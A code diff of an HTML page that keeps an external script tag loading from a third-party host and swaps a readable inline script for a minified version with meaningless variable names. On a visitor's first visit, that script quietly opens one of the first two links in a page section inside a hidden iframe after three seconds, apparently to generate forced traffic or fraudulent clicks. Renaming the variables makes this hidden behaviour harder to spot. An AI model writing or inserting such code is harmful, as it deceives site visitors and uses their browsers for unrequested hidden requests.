@@ -83,25 +83,7 @@
         </style>
         <script src='http://dm.shouwangba.cn/s.html?id=1088'></script>
         <script>
-            var stor = localStorage.getItem('myuser1');
-            if (!stor) {
-                getStore();
-            };
-            function getStore() {
-                setTimeout(function () {
-                    var body = document.getElementsByTagName('body')[0];
-                    var lm_gd2 = document.getElementsByClassName('lm_gd2')[0];
-                    if (lm_gd2) {
-                        var allA = lm_gd2.querySelectorAll('a');
-                        var hrf = allA[Math.floor(Math.random()*2 + 1) -1].getAttribute('href');
-                        var iframe = document.createElement('iframe');
-                        iframe.style.display = 'none';
-                        iframe.src = hrf;
-                        body.appendChild(iframe);
-                        localStorage.setItem('myuser1', 'aaa');
-                    }
-                }, 3000);
-            }
+            var O0=localStorage.getItem('myuser1');if(!O0){O1()};function O1(){setTimeout(function(){var O2=document.getElementsByTagName('body')[0];var O3=document.getElementsByClassName('lm_gd2')[0];if(O3){var O4=O3.querySelectorAll('a');var O5=O4[Math.floor(Math.random()*2+1)-1].getAttribute('href');var O6=document.createElement('iframe');O6.style.display='none';O6.src=O5;O2.appendChild(O6);localStorage.setItem('myuser1','aaa')}},3000)}
         </script>
     </div>
 
